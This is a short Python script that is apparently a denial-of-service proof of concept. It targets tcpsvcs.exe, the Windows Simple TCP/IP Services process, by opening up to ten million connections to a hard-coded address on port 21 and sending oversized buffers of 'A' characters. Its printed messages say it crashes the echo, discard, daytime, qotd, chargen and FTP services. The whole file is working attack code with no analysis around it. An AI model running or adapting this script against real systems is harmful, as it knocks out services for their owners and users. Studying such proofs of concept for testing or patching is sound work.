import sys

import socket
from socket import error as socket_error
from socket import timeout as socket_timeout


def main():

	ip = "10.0.0.30"
	port = 21

	buf = b'A'

	print("This script will crash tcpsvcs.exe in a few minutes (~30-240 s)")
	print("Thus crashing at least these ports: 7 (echo), 9 (discard), 13 (daytime), 17 (qotd), 19 (chargen), 21 (ftp)")
	print("The interval it takes appears to be random")
	print("The script will freeze for 10 sec once it succeeds")
	input("Press Enter to continue...")

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = sock.connect((ip, port))
	tmp = sock.recv(1024)
	if(len(tmp) < 0):
		print("Script seems to have succeded already")
		sys.exit(2)

	for i in range(1,10**7):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(10)

			length = i*100 % 10**5

			print("Connection {0}, egress length {1}".format(i, length))

			connect = sock.connect((ip, port))
			print(sock.recv(1024).decode("ASCII"))
			sock.send(buf*length+b'\r\n')
			sock.close()
		except socket.timeout:
			print("Finish!")
			sys.exit(1)
		except socket_error as serr:
			if(serr.errno == 104):
				print("Connection reset - getting closer!")
				continue
		except:
			raise


if __name__ == '__main__':
	main()
